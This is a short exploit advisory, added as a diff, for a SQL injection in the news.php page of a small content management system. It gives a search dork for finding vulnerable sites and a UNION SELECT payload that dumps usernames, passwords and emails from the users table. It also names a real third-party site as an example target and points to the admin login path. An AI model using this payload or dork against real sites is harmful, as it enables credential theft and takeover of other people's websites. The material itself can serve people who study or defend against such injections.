@@ -1,0 +1,30 @@
+################################################################################################
+#  Exploit Title: Content-Management-System Remote SQL Injection (news.php)
+#  Script Page : http://tim-hendriks.com
+#  Date: 24-3-2012
+#  Version: Version 2.1
+#  Author : Ali.Erroor
+#  Tested on: Firefox 8.0, Palemoon 8.0, Internet Explorer 9
+#  Mail: ali.erroor@att.net
+#  Web Site : www.anti-network.net
+################################################################################################
+ 
+## Injection Point : /news.php?id=-9 [ SQL ]
+
+## Dork: intext:"Powered by Content-Management-System " © Tim Hendriks 2008 " + inurl:news.php?id=
+ 
+## Exploit Code: /news.php?id=-9 union select 1,2,3,4,group_concat(username,0x3a,pass,0x3a,email))from cms_users--
+ 
+ 
+## Example: http://www.boom-trikes.de/news.php?id=-9 union select 1,2,3,4,group_concat(username,0x3a,pass,0x3a,email))from cms_users--
+
+## Login Admin Panel : http://server/cms/
+ 
+ 
+################################################################################################
+ 
+## Greets To :
+
+BARBOD And all of your friends
+ 
+THANKS TO ALL Iranian HackerZ  ./Persian Gulf
